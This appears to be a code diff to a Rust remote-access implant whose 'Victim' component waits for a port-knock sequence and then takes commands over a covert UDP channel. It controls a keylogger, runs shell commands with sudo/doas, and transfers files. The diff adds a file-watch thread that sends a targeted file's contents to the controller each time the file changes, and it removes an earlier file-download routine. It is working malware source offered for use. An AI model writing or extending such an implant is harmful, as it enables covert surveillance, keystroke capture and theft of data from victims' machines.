@@ -2,19 +2,20 @@
 ///
 /// - Detects port knock sequence using shared PRNG
 /// - Listens on derived covert UDP port for commands
-/// - Executes commands: keylogger control, shell execution, file transfer
-/// - Supports cd, sudo, doas, and command piping
+/// - Executes commands: keylogger control, shell execution, file transfer, file watching
 ///
 /// Compliance: All protocol data in UDP payload only.
 /// UDP header fields are OS-managed; no transport-layer abuse.
 
-use std::io::{self, Write};  // FIX: Add Write import
+use std::io::{self, Write};
 use std::net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket};
 use std::sync::mpsc::{self, Receiver, Sender};
 use std::thread;
 use std::time::{Duration, Instant};
 use std::process::Command;
 use std::path::PathBuf;
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
 
 use pnet::packet::tcp::TcpPacket;
 use pnet::packet::ipv4::Ipv4Packet;
@@ -33,8 +34,10 @@ use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP, 
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
+             PACKET_TYPE_WATCH_DATA, PACKET_TYPE_WATCH_DELETED,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
-             CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
+             CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL,
+             CTRL_WATCH_FILE, CTRL_STOP_WATCH};
 
 use keylogger::Control as KeylogControl;
 
@@ -42,6 +45,7 @@ use keylogger::Control as KeylogControl;
 const BUFFER_SIZE: usize = 4096;
 const KNOCK_TIMEOUT_SECS: u64 = 5;
 const HEARTBEAT_INTERVAL: u64 = 10;
+const WATCH_CHECK_INTERVAL: u64 = 2;
 
 struct Victim {
     local_ip: Ipv4Addr,
@@ -55,6 +59,9 @@ struct Victim {
     file_download_active: bool,
     file_download_path: Option<String>,
     file_download_sent: usize,
+    watch_thread: Option<std::thread::JoinHandle<()>>,
+    watched_file: Option<String>,
+    watch_stop_flag: Option<Arc<AtomicBool>>,
 }
 
 impl Victim {
@@ -74,6 +81,9 @@ impl Victim {
             file_download_active: false,
             file_download_path: None,
             file_download_sent: 0,
+            watch_thread: None,
+            watched_file: None,
+            watch_stop_flag: None,
         })
     }
 
@@ -258,7 +268,7 @@ impl Victim {
         }
     }
 
-    fn handle_control(&mut self, subtype: u8, _payload: &[u8], 
+    fn handle_control(&mut self, subtype: u8, payload: &[u8], 
                       udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
         match subtype {
             CTRL_START_KEYLOGGER => {
@@ -276,13 +286,155 @@ impl Victim {
             CTRL_UNINSTALL => {
                 println!("[*] Uninstall signal received");
                 self.stop_keylogger();
+                self.stop_file_watch();
                 std::process::exit(0);
+            }
+            CTRL_WATCH_FILE => {
+                println!("[*] File watch requested");
+                if !payload.is_empty() {
+                    let path_len = payload[0] as usize;
+                    if payload.len() >= 1 + path_len {
+                        let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
+                        self.start_file_watch(&file_path, udp, cmd_addr)?;
+                    }
+                }
+            }
+            CTRL_STOP_WATCH => {
+                println!("[*] Stop watch requested");
+                self.stop_file_watch();
             }
             _ => {
                 println!("[!] Unknown control subtype: {}", subtype);
             }
         }
         Ok(())
+    }
+
+    fn start_file_watch(&mut self, file_path: &str, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
+        self.stop_file_watch();
+        
+        let file_path = file_path.to_string();
+        println!("[*] Starting watch on: {}", file_path);
+        
+        let path = std::path::Path::new(&file_path);
+
+        if !path.exists() {
+            let err = format!("File does not exist: {}\n", file_path);
+            self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
+            return Ok(());
+        }
+
+        match std::fs::metadata(&file_path) {
+            Ok(metadata) => {
+                if !metadata.is_file() {
+                    let err = format!("Path is not a file (it is a directory): {}\n", file_path);
+                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
+                    return Ok(());
+                }
+            }
+            Err(e) => {
+                let err = format!("Cannot access file metadata: {}\n", e);
+                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
+                return Ok(());
+            }
+        }
+        
+        if let Err(e) = std::fs::read(&file_path) {
+            let err = match e.kind() {
+                io::ErrorKind::PermissionDenied => {
+                    format!("Permission denied: {} - Run victim as root\n", file_path)
+                }
+                _ => format!("Cannot read file: {} - {}\n", file_path, e)
+            };
+            self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
+            println!("[!] File watch failed: {}", err);
+            return Ok(());
+        }
+        
+        self.watched_file = Some(file_path.clone());
+        
+        let file_path_clone = file_path.clone();
+        let udp_clone = udp.try_clone()?;
+        let cmd_addr_clone = cmd_addr;
+        let stop_flag = Arc::new(AtomicBool::new(false));
+        self.watch_stop_flag = Some(stop_flag.clone());
+        
+        let handle = thread::spawn(move || {
+            let mut last_size = 0;
+            let mut last_hash = 0u64;
+            let mut file_existed = true;
+            
+            loop {
+                if stop_flag.load(Ordering::Relaxed) {
+                    break;
+                }
+                
+                thread::sleep(Duration::from_secs(WATCH_CHECK_INTERVAL));
+                
+                let path_exists = std::path::Path::new(&file_path_clone).exists();
+                
+                if !path_exists && file_existed {
+                    println!("[FILE WATCH] File deleted: {}", file_path_clone);
+                    let header = PacketHeader::new(PACKET_TYPE_WATCH_DELETED, 0, &file_path_clone);
+                    let mut packet = Vec::with_capacity(HEADER_SIZE);
+                    packet.extend_from_slice(&header.to_bytes());
+                    let _ = udp_clone.send_to(&packet, cmd_addr_clone);
+                    file_existed = false;
+                    continue;
+                }
+                
+                if path_exists && !file_existed {
+                    println!("[FILE WATCH] File restored: {}", file_path_clone);
+                    file_existed = true;
+                    last_size = 0;
+                    last_hash = 0;
+                }
+                
+                if path_exists {
+                    if let Ok(metadata) = std::fs::metadata(&file_path_clone) {
+                        let current_size = metadata.len();
+                        
+                        if let Ok(content) = std::fs::read(&file_path_clone) {
+                            let current_hash = simple_hash(&content);
+                            
+                            if current_size != last_size || current_hash != last_hash {
+                                let header = PacketHeader::new(PACKET_TYPE_WATCH_DATA, 0, &file_path_clone);
+                                let mut packet = Vec::with_capacity(HEADER_SIZE + content.len());
+                                packet.extend_from_slice(&header.to_bytes());
+                                packet.extend_from_slice(&content);
+                                
+                                let _ = udp_clone.send_to(&packet, cmd_addr_clone);
+                                
+                                println!("[FILE WATCH] Change detected, sent {} bytes", content.len());
+                                
+                                last_size = current_size;
+                                last_hash = current_hash;
+                            }
+                        }
+                    }
+                }
+            }
+        });
+        
+        self.watch_thread = Some(handle);
+        
+        let msg = format!("Watching file: {}\n", file_path);
+        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, msg.as_bytes())?;
+        
+        Ok(())
+    }
+
+    fn stop_file_watch(&mut self) {
+        if let Some(ref stop_flag) = self.watch_stop_flag {
+            stop_flag.store(true, Ordering::Relaxed);
+        }
+        
+        if self.watch_thread.is_some() {
+            println!("[*] Stopping file watch");
+            self.watch_thread = None;
+            self.watched_file = None;
+            self.watch_stop_flag = None;
+        }
     }
 
     fn start_keylogger(&mut self) {
@@ -320,11 +472,6 @@ impl Victim {
     }
 
     fn execute_shell(&mut self, cmd: &str, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
-        if !cmd.is_empty() && cmd.as_bytes()[0] == 0x70 {
-            self.handle_file_download(&cmd.as_bytes()[1..], udp, cmd_addr)?;
-            return Ok(());
-        }
-
         if cmd.trim_start().starts_with("cd ") {
             let dir = cmd.trim_start_matches("cd ").trim();
             
@@ -434,43 +581,8 @@ impl Victim {
         Ok(())
     }
 
-    fn handle_file_download(&mut self, payload: &[u8], udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
-        if payload.is_empty() { return Ok(()); }
-        
-        let path_len = payload[0] as usize;
-        if payload.len() < 1 + path_len { return Ok(()); }
-        
-        let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
-        println!("[*] Download request for: {}", file_path);
-        
-        let file_data = match std::fs::read(&file_path) {
-            Ok(data) => data,
-            Err(e) => {
-                let err = format!("Failed to read file: {}\n", e);
-                self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, err.as_bytes())?;
-                return Ok(());
-            }
-        };
-        
-        println!("[*] Sending {} bytes from {}", file_data.len(), file_path);
-        
-        const CHUNK_SIZE: usize = 1024;
-        let total_chunks = (file_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
-        
-        for (i, chunk) in file_data.chunks(CHUNK_SIZE).enumerate() {
-            self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;  // FIX: Now accepts &[u8]
-            print!("\r[*] Sending chunk {}/{}...", i + 1, total_chunks);
-            io::stdout().flush().ok();  // FIX: Write trait is now in scope
-            thread::sleep(Duration::from_millis(50));
-        }
-        
-        self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;  // FIX: Now accepts &[u8]
-        println!("\n[+] File download complete!");
-        Ok(())
-    }
-
     fn send_response(&self, udp: &UdpSocket, addr: SocketAddr, 
-                     ptype: u8, subtype: u8, content: &[u8]) -> io::Result<()> {  // FIX: Changed from &str to &[u8]
+                     ptype: u8, subtype: u8, content: &[u8]) -> io::Result<()> {
         let content_str = String::from_utf8_lossy(content);
         let header = PacketHeader::new(ptype, subtype, &content_str);
         let mut packet = Vec::with_capacity(HEADER_SIZE + content.len());
@@ -480,6 +592,15 @@ impl Victim {
         udp.send_to(&packet, addr)?;
         Ok(())
     }
+}
+
+fn simple_hash(data: &[u8]) -> u64 {
+    let mut hash: u64 = 0;
+    for (i, &byte) in data.iter().enumerate() {
+        hash = hash.wrapping_add((byte as u64).wrapping_mul(i as u64 + 1));
+        hash = hash.wrapping_mul(31);
+    }
+    hash
 }
 
 fn main() -> io::Result<()> {
